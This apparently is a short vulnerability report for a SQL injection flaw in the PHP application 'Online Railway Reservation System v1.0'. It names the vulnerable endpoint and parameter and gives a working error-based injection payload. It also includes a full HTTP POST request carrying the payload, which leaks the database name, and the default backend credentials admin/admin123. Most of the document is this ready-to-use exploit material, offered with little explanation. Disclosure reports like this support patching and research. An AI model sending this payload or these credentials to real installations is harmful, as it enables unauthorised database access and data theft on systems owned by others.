# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/classes/Master.php?f=delete_schedule

Vulnerability location: /orrs/classes/Master.php?f=delete_schedule, id=

Current database name: orrs_db,length is 7

[+] Payload:  id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id

```sql
POST /orrs/classes/Master.php?f=delete_schedule HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/orrs/admin/?page=schedules
Content-Length: 65
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/172341014-24359b87-2560-4a83-8f9b-53168b929fc5.png)
